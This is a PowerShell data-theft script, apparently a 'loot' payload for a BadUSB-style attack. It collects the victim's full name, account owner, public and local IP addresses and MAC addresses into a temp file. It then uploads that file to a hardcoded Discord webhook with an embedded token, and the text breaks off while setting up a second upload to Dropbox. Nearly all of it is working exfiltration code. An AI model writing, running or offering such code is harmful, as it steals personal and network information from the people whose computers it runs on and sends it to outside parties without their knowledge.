$FileName = "$env:temp\$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

#------------------------------------------------------------------------------------------------------------------------------------

function Get-fullName {

    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
 
    # If no name is detected function will return $env:UserName 
    # Write Error is just for troubleshooting 
    catch {
        Write-Error "No name was detected" 
        return $env:UserName
        -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName


#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    }

    # If no email is detected function will return backup message for sapi speak
    # Write Error is just for troubleshooting
    catch {
        Write-Error "An email was not found" 
        return "No Email Detected"
        -ErrorAction SilentlyContinue
    }        
}

$email = Get-email

#------------------------------------------------------------------------------------------------------------------------------------


try {
    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch {
    $computerPubIP="Error getting Public IP"
}



$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------


$output = @"
Full Name: $fullName
Email: $email
------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP
Local IPs:
$localIP
MAC:
$MAC
"@

$output > $FileName

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "https://discordapp.com/api/webhooks/1078994650855129089/Rovrm4M0p5x5SV_1wKAELFhb_FbKu0B_DfSvXPrJXfo0lQr9vULtM78SdpEcr-1uKInc"

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))){
        $content = Get-Content $file -Encoding Byte
        Invoke-RestMethod -Method Post -Uri $hookurl -ContentType multipart/form-data -Body @{
            "file" = $content
        }
    }
}

if (-not ([string]::IsNullOrEmpty($hookurl))){
    Upload-Discord -file "$FileName"
}


#------------------------------------------------------------------------------------------------------------------------------------

function DropBox-Upload {

    [CmdletBinding()]
    param (
        
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object
